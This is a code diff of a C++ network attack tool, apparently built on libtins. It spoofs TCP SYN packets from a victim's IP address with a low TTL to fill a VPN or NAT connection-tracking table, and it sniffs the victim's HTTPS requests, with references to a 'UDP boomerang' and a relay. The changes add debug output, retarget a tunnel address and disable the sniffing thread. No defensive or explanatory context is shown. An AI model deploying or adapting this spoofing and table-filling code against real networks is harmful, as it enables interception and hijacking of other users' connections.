@@ -147,7 +147,9 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 	const IP &ip = some_pdu.rfind_pdu<IP>();
 	const TCP &tcp_req = some_pdu.rfind_pdu<TCP>();
 	unsigned short vport;
-//define IPPROTO_TCP 6 
+//define IPPROTO_TCP 6
+	if(ip.protocol()==IPPROTO_TCP && ip.dst_addr()=="10.8.0.6") 
+	std::cout<<"FOUND: "<<ip.src_addr() <<" : "<<tcp_req.sport()<<" -> "<<ip.dst_addr()<<" : "<<tcp_req.dport()<<"\n";
 	if (ip.src_addr() == victim_ip && ip.protocol() == IPPROTO_TCP &&
 			tcp_req.dport()==https_port) {
 		vport = some_pdu.rfind_pdu<TCP>().sport();
@@ -183,10 +185,11 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 void do_fill_table() {
         PacketSender sender;
         NetworkInterface iface("tun0"); // public_iface);//  
+		std::cout<<"Filling\n";
         while (tcp_continue_ephem) {
 		for (short i=PORT_RANGE_START;i<PORT_RANGE_END; i++) {
                         // TCP packets placed in the ASSURED state
-                        IP pkt = IP(victim_ip, "10.8.0.14") / TCP(i, https_port); 
+                        IP pkt = IP(victim_ip, "10.8.0.6") / TCP(i, https_port); 
 			IP& ip = pkt.rfind_pdu<IP>();
 			ip.ttl(2);
                         TCP &tcp = pkt.rfind_pdu<TCP>(); 
@@ -195,6 +198,7 @@ void do_fill_table() {
                         tcp.set_flag(TCP::SYN, 1); 
 			sender.send(pkt, iface);
                 }
+		std::cout<<"done\n";
 		usleep(10000000);
         }
 }
@@ -224,8 +228,8 @@ int main(int argc, char** argv) {
 	thread fill_table_thread(do_fill_table);
 	fill_table_thread.detach();
 
-	thread sniff_http_request(sniff_website_request_handler);
-	sniff_http_request.join();
+	// thread sniff_http_request(sniff_website_request_handler);
+	// sniff_http_request.join();
 
         // Get the UDP boomerang ready	
 	//
@@ -250,5 +254,6 @@ int main(int argc, char** argv) {
 	thread relay_thread(relay_packet_handler);
 	relay_thread.join();
 	*/
+	while(1);
 	return 0;
 }
